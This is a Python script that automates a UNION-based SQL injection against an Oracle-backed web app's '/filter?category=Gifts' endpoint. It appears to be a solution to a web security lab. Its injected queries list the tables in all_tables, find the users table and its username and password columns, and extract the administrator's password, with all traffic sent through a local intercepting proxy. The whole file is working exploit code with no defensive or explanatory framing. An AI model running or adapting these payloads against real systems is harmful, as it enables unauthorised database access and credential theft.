import requests
import sys  
import urllib3
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path = "/filter?category=Gifts"
    req = requests.get(url + path + sql_payload, proxies=proxies, verify=False)
    return req.text
    

def sqli_users_table(url):
    sql_payload = "' UNION SELECT TABLE_NAME, NULL from all_tables--" 
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')    
    users_table_pattern = re.compile('.*^USERS\_.*')
    users_table_element = soup.find('th', string=users_table_pattern)
    users_table = users_table_element.text if users_table_element else None
    return users_table

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = '%s'--"   % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')    
    username_pattern = re.compile('.*USERNAME.*')   
    password_pattern = re.compile('.*PASSWORD.*')
    username_element = soup.find('th', string=username_pattern)
    password_element = soup.find('th', string=password_pattern)
    username_col = username_element.text if username_element else None
    password_col = password_element.text if password_element else None
    return username_col, password_col

def sqli_administrator_cred(url, users_table, username_col, password_col):
    sql_payload = "' UNION SELECT %s, %s FROM %s--" % (username_col, password_col, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')    
    admin_pattern = re.compile('administrator')
    admin_element = soup.find(string=admin_pattern).parent.findNext('td')
    admin_password = admin_element.text if admin_element else None
    return admin_password

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() #we take the URL from command line arguments
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print("[-] Example: %s http://example.com '1=1'" % sys.argv[0])
        sys.exit(-1)


    print("[+] looking for the users table...")
    users_table = sqli_users_table(url)
    if  users_table:
        print("[-] Found the users table: %s" % users_table)
    else:
        print("[-] Could not find the users table")
    

    print("[+] looking for the users table columns...")
    username_col, password_col = sqli_users_columns(url, users_table)
    if username_col and password_col:
        print(f"[+] Found the username column: {username_col}")
        print(f"[+] Found the password column: {password_col}")
    else:
        print("[-] Could not find the username and password columns")

    print("[+] looking for the administrator passoword")    
    admin_password = sqli_administrator_cred(url, users_table, username_col, password_col)
    if admin_password:
        print(f"[+] Found the administrator password: {admin_password}")
    else:
        print("[-] Could not find the administrator password")